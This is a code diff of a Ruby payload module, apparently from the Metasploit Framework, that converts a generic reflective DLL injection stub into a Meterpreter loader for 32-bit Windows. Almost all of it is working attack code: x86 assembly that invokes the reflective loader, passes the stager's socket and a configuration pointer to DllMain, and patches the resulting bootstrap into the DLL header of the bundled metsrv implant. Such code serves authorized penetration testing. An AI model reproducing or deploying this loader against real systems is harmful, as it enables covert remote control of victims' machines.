@@ -5,24 +5,22 @@ require 'msf/core/reflective_dll_loader'
 
 module Msf
 
-
 ###
 #
-# Common module stub for ARCH_X86 payloads that make use of Reflective DLL Injection.
+# Common module stub for ARCH_X86 payloads that make use of Meterpreter.
 #
 ###
 
-
-module Payload::Windows::ReflectiveDllInject
+module Payload::Windows::MeterpreterLoader
 
   include Msf::ReflectiveDLLLoader
   include Msf::Payload::Windows
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Reflective DLL Injection',
-      'Description'   => 'Inject a DLL via a reflective loader',
-      'Author'        => [ 'sf' ],
+      'Name'          => 'Meterpreter & Configuration RDI',
+      'Description'   => 'Inject Meterpreter & the configuration stub via RDI',
+      'Author'        => [ 'sf', 'OJ Reeves' ],
       'References'    => [
         [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
         [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
@@ -32,15 +30,9 @@ module Payload::Windows::ReflectiveDllInject
       'PayloadCompat' => { 'Convention' => 'sockedi -https', },
       'Stage'         => { 'Payload'   => "" }
       ))
-
-    register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
   end
 
-  def library_path
-    datastore['DLL']
-  end
-
-  def asm_invoke_dll(opts={})
+  def asm_invoke_metsrv(opts={})
     asm = %Q^
         ; prologue
           dec ebp               ; 'M'
@@ -56,37 +48,42 @@ module Payload::Windows::ReflectiveDllInject
           add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
           call ebx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
-          push edi              ; push the socket handle
+          ; offset from ReflectiveLoader() to the end of the DLL
+          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+    ^
+
+    unless opts[:stageless]
+      asm << %Q^
+          mov [ebx], edi        ; write the current socket to the config
+      ^
+    end
+
+    asm << %Q^
+          push ebx              ; push the pointer to the configuration start
           push 4                ; indicate that we have attached
           push eax              ; push some arbitrary value for hInstance
-          mov ebx, eax          ; save DllMain for another call
-          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
-        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
-          ; push the exitfunk value onto the stack
-          push #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
-          push 5                ; indicate that we have detached
-          push eax              ; push some arbitrary value for hInstance
-          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
     ^
   end
 
-  def stage_payload
+  def stage_meterpreter(stageless=false)
     # Exceptions will be thrown by the mixin if there are issues.
-    dll, offset = load_rdi_dll(library_path)
+    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))
 
     asm_opts = {
       rdi_offset: offset,
-      exitfunk:   'thread'  # default to 'thread' for migration
+      length:     dll.length,
+      stageless:  stageless
     }
 
-    asm = asm_invoke_dll(asm_opts)
+    asm = asm_invoke_metsrv(asm_opts)
 
     # generate the bootstrap asm
     bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
     if bootstrap.length > 62
-      raise RuntimeError, "Reflective DLL Injection (x86) generated an oversized bootstrap!"
+      raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!"
     end
 
     # patch the bootstrap code into the dll's DOS header...
